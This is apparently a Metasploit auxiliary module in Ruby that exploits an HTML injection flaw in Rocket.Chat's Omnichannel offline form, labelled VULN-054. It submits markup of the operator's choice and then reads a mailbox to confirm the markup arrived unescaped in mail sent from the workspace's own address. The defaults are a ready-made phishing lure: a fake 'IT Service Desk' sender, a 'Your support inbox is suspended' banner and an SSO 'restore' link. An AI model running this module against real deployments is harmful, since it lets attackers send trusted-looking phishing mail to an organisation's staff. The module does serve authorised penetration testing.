class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 HTML into the support mailbox via the offline form (VULN-054)',
        'Description' => %q{
          Rocket.Chat's Omnichannel offline form takes a name, an address, a message
          and a host from an anonymous website visitor and mails them to the support
          mailbox from the workspace's own address, interpolating every field into the
          HTML template without escaping. An anonymous caller can therefore put
          working markup and a working link into mail that arrives from the
          organisation itself. This module submits the form once with the markup the
          operator chooses, then reads the support mailbox the operator names and
          reports whether the markup arrived live or escaped.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/livechat/offline.message']),
      OptString.new('MAILHOST', [true, 'Host of the operator\'s mailbox API (Mailpit or MailHog shape)', 'mailpit']),
      OptString.new('MAILPORT', [true, 'Port of that mailbox API', '8025']),
      OptString.new('VISITORNAME', [true, 'The name the form is submitted under', 'IT Service Desk']),
      OptString.new('VISITOREMAIL', [true, 'The address the form is submitted under', 'noreply@corp-verify.example']),
      OptString.new('MARKUP', [true, 'The HTML the message field carries into the support mailbox', '<h2>Your support inbox is suspended</h2>']),
      OptString.new('HOSTFIELD', [true, 'The host field, which becomes the Sent-from link in the mail', 'https://sso.corp-verify.example/restore'])
    ])
  end

  def run
    res = submit_offline_form
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = parse_json(res)['success'] == true && workspace_mail_carrying(datastore['MARKUP']) && !@mail_escaped
    fail_with(Failure::NotVulnerable, 'VULN-054: the attack did not land') unless hit

    print_good("#{peer} - VULN-054: exploited")
    print_good("#{peer} - the workspace mailed #{@mail_from} -> the "\
               "support mailbox, subject #{@mail_subject[0, 90].inspect}, "\
               "with the markup live (escaped=#{@mail_escaped})")
    path = store_loot('blue_spider.vuln_054', 'text/plain', rhost, res.body.to_s, 'vuln_054.txt', 'VULN-054 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-054 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # The workspace's own outbound mail is where this finding lands, so the
  # module reads the mailbox the operator names. That is a different host from
  # RHOST, so it goes through a client of its own rather than the HttpClient
  # mixin. Nothing is sent or deleted: the mailbox is only read.
  def mail_get(path)
    cli = Rex::Proto::Http::Client.new(datastore['MAILHOST'], datastore['MAILPORT'].to_i)
    cli.connect(10)
    res = cli.send_recv(cli.request_cgi('method' => 'GET', 'uri' => path), 20)
    cli.close
    res
  rescue StandardError => e
    vprint_error("#{peer} - could not read the mailbox at " \
                 "#{datastore['MAILHOST']}:#{datastore['MAILPORT']}: #{e}")
    nil
  end

  def mail_list(limit = 50)
    res = mail_get("/api/v1/messages?limit=#{limit}")
    return [] unless res

    doc = JSON.parse(res.body.to_s)
    doc['messages'] || doc['items'] || []
  rescue StandardError
    []
  end

  def mail_body(id)
    res = mail_get("/api/v1/message/#{id}")
    return '' unless res

    doc = JSON.parse(res.body.to_s)
    [doc['Subject'], doc['HTML'], doc['Text']].compact.join("\n")
  rescue StandardError
    res ? res.body.to_s : ''
  end

  # The mail that proves it: sent by the workspace itself, carrying text the
  # attacker chose, and carrying it live rather than escaped.
  def workspace_mail_carrying(marker, recipient = '', tries = 6)
    tries.times do |n|
      mail_list.each do |m|
        next unless recipient.empty? || m.to_s.include?(recipient)

        body = mail_body(m['ID'] || m['Id'] || m['id'])
        next unless body.include?(marker)

        @mail_subject = m['Subject'].to_s
        @mail_from = (m.dig('From', 'Address') || m['From']).to_s
        @mail_escaped = body.include?(escaped(marker))
        vprint_status("#{peer} - mail #{(m['ID'] || '').to_s[0, 12]} from " \
                      "#{@mail_from}: #{@mail_subject[0, 70].inspect}")
        return true
      end
      sleep(2) unless n == tries - 1
    end
    false
  end

  def escaped(marker)
    marker.gsub('&', '&amp;').gsub('<', '&lt;').gsub('>', '&gt;')
  end

  def submit_offline_form
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'data' => { 'name' => datastore['VISITORNAME'],
                  'email' => datastore['VISITOREMAIL'],
                  'message' => datastore['MARKUP'],
                  'host' => datastore['HOSTFIELD'] }.to_json
    })
  end
end
